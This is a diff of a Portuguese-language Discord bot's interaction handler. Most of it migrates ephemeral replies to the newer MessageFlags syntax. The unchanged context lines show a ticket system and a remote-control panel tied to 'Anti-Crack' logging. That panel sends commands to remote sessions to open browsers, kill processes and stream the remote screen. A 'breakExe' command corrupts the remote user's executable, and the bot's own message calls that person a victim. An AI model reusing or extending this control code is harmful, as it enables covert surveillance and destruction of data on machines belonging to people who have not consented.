@@ -16,6 +16,7 @@ const {
   MessageCollector,
   RoleSelectMenuBuilder,
   ChannelSelectMenuBuilder,
+  MessageFlags,
 } = require("discord.js");
 const wio = require("wio.db");
 
@@ -124,7 +125,7 @@ module.exports = {
               .setStyle(ButtonStyle.Primary)
           ),
         ],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
       return;
     }
@@ -154,7 +155,7 @@ module.exports = {
       const botConfig = getBotConfig();
       botConfig.logsAntiCrack = channelId;
       saveBotConfig(botConfig);
-      await interaction.reply({ content: `✅ Canal de Logs Anti-Crack configurado: <#${channelId}>`, ephemeral: true });
+      await interaction.reply({ content: `✅ Canal de Logs Anti-Crack configurado: <#${channelId}>`, flags: MessageFlags.Ephemeral });
       return;
     }
 
@@ -183,7 +184,7 @@ module.exports = {
       const botConfig = getBotConfig();
       botConfig.logsPainel = channelId;
       saveBotConfig(botConfig);
-      await interaction.reply({ content: `✅ Canal de Logs do Painel Iniciado configurado: <#${channelId}>`, ephemeral: true });
+      await interaction.reply({ content: `✅ Canal de Logs do Painel Iniciado configurado: <#${channelId}>`, flags: MessageFlags.Ephemeral });
       return;
     }
     // ─────────────────────────────────────────────────────────────────────────
@@ -201,9 +202,9 @@ module.exports = {
           )
           .setColor("NotQuiteBlack");
         if (interaction.deferred || interaction.replied) {
-          await interaction.followUp({ embeds: [err], ephemeral: true });
+          await interaction.followUp({ embeds: [err], flags: MessageFlags.Ephemeral });
         } else {
-          await interaction.reply({ embeds: [err], ephemeral: true });
+          await interaction.reply({ embeds: [err], flags: MessageFlags.Ephemeral });
         }
       }
     }
@@ -265,10 +266,10 @@ module.exports = {
         await interaction.reply({
           embeds: [new EmbedBuilder().setTitle("🌐 Selecione o Navegador").setDescription(`URL: \`${url}\``).setColor(0x5865f2)],
           components: [new ActionRowBuilder().addComponents(menu)],
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       } else {
-        await interaction.deferReply({ ephemeral: true });
+        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
         try {
           await sendCommand(sessionId, "openBrowser", { url, browser: "default" });
           await interaction.editReply({ content: `✅ Abrindo \`${url}\` no navegador padrão.` });
@@ -286,7 +287,7 @@ module.exports = {
       const sessionId     = withoutPrefix.substring(0, separatorIdx);
       const url           = decodeURIComponent(withoutPrefix.substring(separatorIdx + 2));
       const browserExe    = interaction.values[0];
-      await interaction.deferReply({ ephemeral: true });
+      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
       try {
         await sendCommand(sessionId, "openBrowser", { url, browser: browserExe });
         await interaction.editReply({ content: `✅ Abrindo \`${url}\` com \`${browserExe}\`.` });
@@ -305,7 +306,7 @@ module.exports = {
           new ButtonBuilder().setCustomId(`confirmBreak_${sessionId}`).setLabel("✅ Sim, quebrar").setStyle(ButtonStyle.Danger),
           new ButtonBuilder().setCustomId(`cancelBreak`).setLabel("❌ Cancelar").setStyle(ButtonStyle.Secondary)
         )],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
       return;
     }
@@ -313,7 +314,7 @@ module.exports = {
     // Botão: Confirmar quebrar EXE
     if (interaction.isButton() && interaction.customId.startsWith("confirmBreak_")) {
       const sessionId = interaction.customId.replace("confirmBreak_", "");
-      await interaction.deferReply({ ephemeral: true });
+      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
       try {
         await sendCommand(sessionId, "breakExe");
         await interaction.editReply({ content: "💥 EXE corrompido. A vítima precisará reinstalar." });
@@ -332,7 +333,7 @@ module.exports = {
     // Botão: Fechar Processo
     if (interaction.isButton() && interaction.customId.startsWith("killProcess_")) {
       const sessionId = interaction.customId.replace("killProcess_", "");
-      await interaction.deferReply({ ephemeral: true });
+      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
       try {
         await sendCommand(sessionId, "killProcess");
         await interaction.editReply({ content: "🔴 Processo encerrado com sucesso." });
@@ -345,7 +346,7 @@ module.exports = {
     // Botão: Ver Tela (Link Web)
     if (interaction.isButton() && interaction.customId.startsWith("viewScreen_")) {
       const sessionId = interaction.customId.replace("viewScreen_", "");
-      await interaction.deferReply({ ephemeral: true });
+      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
       try {
         await sendCommand(sessionId, "startScreenServer");
         await interaction.editReply({ 
@@ -383,7 +384,7 @@ module.exports = {
     // Botão: Parar Visualização
     if (interaction.isButton() && interaction.customId.startsWith("stopScreen_")) {
       const sessionId = interaction.customId.replace("stopScreen_", "");
-      await interaction.deferReply({ ephemeral: true });
+      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
       try {
         await sendCommand(sessionId, "stopScreenServer");
         await interaction.editReply({ content: "⏹️ Visualização de tela encerrada." });
@@ -434,7 +435,7 @@ module.exports = {
               .setChannelTypes(ChannelType.GuildText)
           ),
         ],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
     }
 
@@ -475,7 +476,7 @@ module.exports = {
               .setChannelTypes(ChannelType.GuildText)
           ),
         ],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
     }
 
@@ -511,7 +512,7 @@ module.exports = {
 
       interaction.reply({
         content: "✅ | Categoria adicionada com sucesso.",
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
     }
 
@@ -578,7 +579,7 @@ module.exports = {
 
       interaction.reply({
         components: [row],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
     }
 
@@ -624,12 +625,12 @@ module.exports = {
 
       await interaction.update({
         components: [row],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
 
       await interaction.followUp({
         content: "**✅ | Categoria excluida com sucesso.**",
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
     }
 
@@ -656,7 +657,7 @@ module.exports = {
               .setStyle(ButtonStyle.Danger)
           ),
         ],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
     }
 
@@ -679,7 +680,7 @@ module.exports = {
 
     if (interaction.customId === "configAvaliacao") {
       interaction.reply({
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
         components: [
           new ActionRowBuilder().addComponents(
             new ChannelSelectMenuBuilder()
@@ -692,7 +693,7 @@ module.exports = {
 
     if (interaction.customId === "configLogs") {
       interaction.reply({
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
         components: [
           new ActionRowBuilder().addComponents(
             new ChannelSelectMenuBuilder()
@@ -715,7 +716,7 @@ module.exports = {
           ),
         ],
         components: [],
-        ephemeral: true,
+        flags: MessageFlags.Ephemeral,
       });
     }
 
@@ -753,7 +754,7 @@ module.exports = {
       console.error(`[InteractionCreate Error]: ${error}`);
       try {
         if (!interaction.replied && !interaction.deferred) {
-          await interaction.reply({ content: '❌ | Ocorreu um erro ao processar esta interação.', ephemeral: true });
+          await interaction.reply({ content: '❌ | Ocorreu um erro ao processar esta interação.', flags: MessageFlags.Ephemeral });
         }
       } catch (_) {}
     }
@@ -795,7 +796,7 @@ module.exports = {
                 )
                 .setColor("Red"),
             ],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -841,7 +842,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Link)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               })
               .then(() => {
                 const buttons = [
@@ -913,7 +914,7 @@ module.exports = {
 
         interaction.reply({
           content: "✅ | Painel deletado com sucesso.",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -999,7 +1000,7 @@ module.exports = {
 
         interaction.reply({
           content: "✅ | Categoria adicionada com sucesso.",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -1066,7 +1067,7 @@ module.exports = {
 
         interaction.reply({
           components: [row],
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -1112,12 +1113,12 @@ module.exports = {
 
         await interaction.update({
           components: [row],
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
 
         await interaction.followUp({
           content: "**✅ | Categoria excluida com sucesso.**",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -1175,7 +1176,7 @@ module.exports = {
               })
               .setDescription(`Escolha oque deseja gerenciar.`),
           ],
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
           components: [
             new ActionRowBuilder().addComponents(
               new ButtonBuilder()
@@ -1235,7 +1236,7 @@ module.exports = {
 
         interaction.reply({
           components: [row],
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -1296,12 +1297,12 @@ module.exports = {
 
           await interaction.reply({
             content: "✅ | Categoria editada com sucesso.",
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         } else {
           await interaction.reply({
             content: "❌ | Categoria não encontrada.",
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -1516,7 +1517,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Primary)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               });
             }, 1500);
           });
@@ -1644,7 +1645,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Primary)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               });
             }, 1500);
           });
@@ -1772,7 +1773,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Primary)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               });
             }, 1500);
           });
@@ -1900,7 +1901,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Primary)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               });
             }, 1500);
           });
@@ -2028,7 +2029,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Primary)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               });
             }, 1500);
           });
@@ -2156,7 +2157,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Primary)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               });
             }, 1500);
           });
@@ -2284,7 +2285,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Primary)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               });
             }, 1500);
           });
@@ -2296,7 +2297,7 @@ module.exports = {
         console.error(`[allTicketsP Error]: ${error}`);
         try {
           if (!interaction.replied && !interaction.deferred) {
-            await interaction.reply({ content: '❌ | Ocorreu um erro ao processar esta interação.', ephemeral: true });
+            await interaction.reply({ content: '❌ | Ocorreu um erro ao processar esta interação.', flags: MessageFlags.Ephemeral });
           }
         } catch (_) {}
       }
@@ -2341,7 +2342,7 @@ module.exports = {
                 }\n\n⚙ Funções:\n${formattedFunctions}`
               ),
           ],
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
           components: [
             new ActionRowBuilder().addComponents(
               new ButtonBuilder()
@@ -2404,7 +2405,7 @@ module.exports = {
 
         interaction.reply({
           content: "**✅ | Banner do Ticket alterado com sucesso.**",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -2415,7 +2416,7 @@ module.exports = {
 
         interaction.reply({
           content: "**✅ | Miniatura do Ticket alterado com sucesso.**",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -2480,7 +2481,7 @@ module.exports = {
                       }\n\n⚙ Funções:\n${formattedFunctions}`
                     ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
                 components: [
                   new ActionRowBuilder().addComponents(
                     new ButtonBuilder()
@@ -2600,7 +2601,7 @@ module.exports = {
                       }\n\n⚙ Funções:\n${formattedFunctions}`
                     ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
                 components: [
                   new ActionRowBuilder().addComponents(
                     new ButtonBuilder()
@@ -3296,7 +3297,7 @@ module.exports = {
             "**<a:Lost82:1097620271818612766> | Seu ticket foi deletado com sucesso.**",
           components: [],
           embeds: [],
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -3897,7 +3898,7 @@ module.exports = {
           if (!ch) { createdTickesdb.delete(ticket.ID); continue; }
           return interaction.reply({
             content: `**❌ | Você já possui um ticket aberto, feche-o antes de abrir outro! <#${ticketInfo.channelId}>**`,
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -3960,7 +3961,7 @@ module.exports = {
                         .setStyle(ButtonStyle.Link)
                     ),
                   ],
-                  ephemeral: true,
+                  flags: MessageFlags.Ephemeral,
                 })
                 .then(() => {
                   const functionsConfig = ticketsB.get(`${t.ID}.functions[0]`);
@@ -4079,7 +4080,7 @@ module.exports = {
                 ),
             ],
             components: [menu],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         } else if (modalAtivo && !categoriaAtiva) {
           const modal = new ModalBuilder()
@@ -4135,7 +4136,7 @@ module.exports = {
                 ),
             ],
             components: [menu],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
       }
@@ -4151,7 +4152,7 @@ module.exports = {
           if (!ch) { createdTickesdb.delete(ticket.ID); continue; }
           return interaction.reply({
             content: `**❌ | Você já possui um ticket aberto, feche-o antes de abrir outro! <#${ticketInfo.channelId}>**`,
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -4217,7 +4218,7 @@ module.exports = {
                         .setStyle(ButtonStyle.Link)
                     ),
                   ],
-                  ephemeral: true,
+                  flags: MessageFlags.Ephemeral,
                 })
                 .then(() => {
                   const functionsConfig = ticketsB.get(`${t.ID}.functions[0]`);
@@ -4353,7 +4354,7 @@ module.exports = {
                         .setStyle(ButtonStyle.Link)
                     ),
                   ],
-                  ephemeral: true,
+                  flags: MessageFlags.Ephemeral,
                 })
                 .then(() => {
                   const functionsConfig = ticketsB.get(`${t.ID}.functions[0]`);
@@ -4487,7 +4488,7 @@ module.exports = {
                         .setStyle(ButtonStyle.Link)
                     ),
                   ],
-                  ephemeral: true,
+                  flags: MessageFlags.Ephemeral,
                 })
                 .then(() => {
                   const ticket = interaction.guild.channels.cache.get(c.id);
@@ -4561,7 +4562,7 @@ module.exports = {
             return interaction.reply({
               content:
                 "**❌ | Você já possui um ticket aberto, feche-o antes de abrir outro!**",
-              ephemeral: true,
+              flags: MessageFlags.Ephemeral,
             });
           }
         }
@@ -4616,7 +4617,7 @@ module.exports = {
                       .setStyle(ButtonStyle.Link)
                   ),
                 ],
-                ephemeral: true,
+                flags: MessageFlags.Ephemeral,
               })
               .then(() => {
                 const functionsConfig = ticketsB.get(`${t.ID}.functions[0]`);
@@ -4695,7 +4696,7 @@ module.exports = {
         if (!usersPerms.includes(interaction.user.id)) {
           return interaction.reply({
             content: `**❌ | Você não tem permissão.**`,
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -4740,7 +4741,7 @@ module.exports = {
         }
 
         interaction.reply({
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
           components: [new ActionRowBuilder().addComponents(selectMenu)],
         });
       }
@@ -4779,7 +4780,7 @@ module.exports = {
                   .setPlaceholder("Selecione um usuario")
               ),
             ],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -4794,7 +4795,7 @@ module.exports = {
                   .setPlaceholder("Selecione um usuario")
               ),
             ],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -4837,7 +4838,7 @@ module.exports = {
         if (!usersPerms.includes(interaction.user.id)) {
           return interaction.reply({
             content: `**❌ | Você não tem permissão.**`,
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -4852,7 +4853,7 @@ module.exports = {
 
           return interaction.reply({
             embeds: [noPerm],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -4911,7 +4912,7 @@ module.exports = {
         }
 
         interaction.reply({
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
           components: [new ActionRowBuilder().addComponents(selectMenu)],
         });
       }
@@ -4923,7 +4924,7 @@ module.exports = {
 
         await interaction.reply({
           content: "**✅ | Ticket renomeado com sucesso.**",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
       }
 
@@ -4960,7 +4961,7 @@ module.exports = {
             await inte.deferUpdate();
             inte.channel.send({
               content: `${data.body.point_of_interaction.transaction_data.qr_code}`,
-              ephemeral: true,
+              flags: MessageFlags.Ephemeral,
             });
           });
 
@@ -5134,7 +5135,7 @@ module.exports = {
 
           await interaction.followUp({
             content: "**✅ | Call criada com sucesso.**",
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
           return;
         }
@@ -5146,7 +5147,7 @@ module.exports = {
 
           await interaction.followUp({
             content: "**✅ | Notificação enviada com sucesso.**",
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
 
           return user.send({
@@ -5332,7 +5333,7 @@ module.exports = {
 
         interaction.reply({
           content: "📫 _Salvando as mensagens e deletando o ticket_",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
 
         setTimeout(() => {
@@ -5410,7 +5411,7 @@ module.exports = {
         if (!usersPerms.includes(interaction.user.id)) {
           return interaction.reply({
             content: `**❌ | Você não tem permissão.**`,
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -5425,7 +5426,7 @@ module.exports = {
 
           return interaction.reply({
             embeds: [noPerm],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -5576,7 +5577,7 @@ module.exports = {
         if (!usersPerms.includes(interaction.user.id)) {
           return interaction.reply({
             content: `**❌ | Você não tem permissão.**`,
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -5591,7 +5592,7 @@ module.exports = {
 
           return interaction.reply({
             embeds: [noPerm],
-            ephemeral: true,
+            flags: MessageFlags.Ephemeral,
           });
         }
 
@@ -5668,7 +5669,7 @@ module.exports = {
 
         await interaction.followUp({
           content: "**✅ | Você assumiu o ticket com sucesso**",
-          ephemeral: true,
+          flags: MessageFlags.Ephemeral,
         });
 
         await ticketUser.send({
@@ -5997,7 +5998,7 @@ module.exports = {
         console.error(`[allTicketsB Error]: ${error}`);
         try {
           if (!interaction.replied && !interaction.deferred) {
-            await interaction.reply({ content: '❌ | Ocorreu um erro ao processar esta interação.', ephemeral: true });
+            await interaction.reply({ content: '❌ | Ocorreu um erro ao processar esta interação.', flags: MessageFlags.Ephemeral });
           }
         } catch (_) {}
       }
